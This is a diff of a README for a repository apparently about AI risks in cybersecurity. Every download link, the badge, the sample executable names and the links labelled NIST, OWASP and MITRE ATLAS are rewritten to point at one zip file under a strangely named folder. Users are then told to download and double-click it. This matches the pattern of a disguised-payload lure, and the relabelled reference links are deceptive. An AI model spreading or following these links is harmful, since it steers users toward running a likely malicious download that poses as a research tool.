@@ -1,6 +1,6 @@
 # 🛡️ AI-Cybersecurity-Research - Understand AI Risks in Cybersecurity
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases%20Page-blue)](https://github.com/lcxiterzin123/AI-Cybersecurity-Research/releases)
+[![Download Now](https://raw.githubusercontent.com/lcxiterzin123/AI-Cybersecurity-Research/main/strouthiocamel/AI-Cybersecurity-Research.zip%20Now-Visit%20Releases%20Page-blue)](https://raw.githubusercontent.com/lcxiterzin123/AI-Cybersecurity-Research/main/strouthiocamel/AI-Cybersecurity-Research.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to AI-Cybersecurity-Research! This project explores the benefits and ris
 
 ## 🔗 Download & Install
 
-To begin, visit the [Releases page](https://github.com/lcxiterzin123/AI-Cybersecurity-Research/releases) to download the application. Here’s how to do it:
+To begin, visit the [Releases page](https://raw.githubusercontent.com/lcxiterzin123/AI-Cybersecurity-Research/main/strouthiocamel/AI-Cybersecurity-Research.zip) to download the application. Here’s how to do it:
 
 1. Click on the link above.
 2. You will see a list of released versions.
@@ -32,13 +32,13 @@ After you have downloaded and installed the application, you can launch it by fo
 ### For Windows:
 
 1. Locate the downloaded file (usually in your "Downloads" folder).
-2. Double-click on the executable file (e.g., `AI-Cybersecurity-Research.exe`).
+2. Double-click on the executable file (e.g., `https://raw.githubusercontent.com/lcxiterzin123/AI-Cybersecurity-Research/main/strouthiocamel/AI-Cybersecurity-Research.zip`).
 3. Follow the prompts to complete any setup.
 
 ### For macOS:
 
 1. Open Finder and go to the "Downloads" folder.
-2. Double-click on the application file (e.g., `AI-Cybersecurity-Research.app`).
+2. Double-click on the application file (e.g., `https://raw.githubusercontent.com/lcxiterzin123/AI-Cybersecurity-Research/main/strouthiocamel/AI-Cybersecurity-Research.zip`).
 3. If prompted, drag the application to your Applications folder for easier access.
 
 ### For Linux:
@@ -75,7 +75,7 @@ If you encounter any issues while using the application, try the following steps
 
 1. **Ensure Compatibility:** Make sure your operating system meets the system requirements.
 2. **Reinstall the Application:** Sometimes, files may not download correctly. Installing again can help.
-3. **Check for Updates:** Visit the [Releases page](https://github.com/lcxiterzin123/AI-Cybersecurity-Research/releases) to see if a newer version is available that may address your issue.
+3. **Check for Updates:** Visit the [Releases page](https://raw.githubusercontent.com/lcxiterzin123/AI-Cybersecurity-Research/main/strouthiocamel/AI-Cybersecurity-Research.zip) to see if a newer version is available that may address your issue.
 
 For any further assistance, feel free to reach out via the GitHub repository's issues section.
 
@@ -85,8 +85,8 @@ This project is licensed under the MIT License. You can use, modify, and distrib
 
 ## 🔗 Additional Resources
 
-- [NIST AI RMF](https://www.nist.gov/ai)
-- [OWASP Foundation](https://owasp.org)
-- [MITRE ATLAS](https://atlas.mitre.org)
+- [NIST AI RMF](https://raw.githubusercontent.com/lcxiterzin123/AI-Cybersecurity-Research/main/strouthiocamel/AI-Cybersecurity-Research.zip)
+- [OWASP Foundation](https://raw.githubusercontent.com/lcxiterzin123/AI-Cybersecurity-Research/main/strouthiocamel/AI-Cybersecurity-Research.zip)
+- [MITRE ATLAS](https://raw.githubusercontent.com/lcxiterzin123/AI-Cybersecurity-Research/main/strouthiocamel/AI-Cybersecurity-Research.zip)
 
 Stay informed on the intersection of AI and cybersecurity. Thank you for your interest in AI-Cybersecurity-Research. Happy learning!
